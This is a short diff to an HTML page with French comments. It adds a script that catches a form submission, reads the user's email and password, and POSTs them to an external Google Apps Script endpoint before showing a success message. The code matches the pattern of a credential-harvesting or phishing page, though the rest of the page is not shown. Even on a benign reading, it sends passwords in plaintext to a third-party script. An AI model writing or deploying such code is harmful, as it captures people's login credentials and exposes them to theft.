@@ -35,6 +35,29 @@
     
     <script src="script.js"></script> <!-- Inclure le script -->
 
-</body>
+ </section> 
+ 
+ <script>
+    document.getElementById('myForm').addEventListener('submit', function(e) {
+        e.preventDefault(); // Empêche le formulaire de recharger la page
+    
+        // Récupérer les valeurs du formulaire
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+    
+        // Envoi des données vers Google Apps Script
+        fetch('https://script.google.com/macros/s/AKfycby1kTbCsRAJYTvgj2bv0QI6Au9zii8mh39FKj4Nc5XQvu3y0oNNU9Tfo9-wihnLqbq5/exec', {
+            method: 'POST',
+            body: new URLSearchParams({
+                'email': email,
+                'password': password
+            })
+        })
+        .then(response => response.json())
+        .then(data => alert('Données envoyées avec succès !'))
+        .catch(error => console.error('Erreur:', error));
+    });
+    </script>    
 
+</body>
 </html>
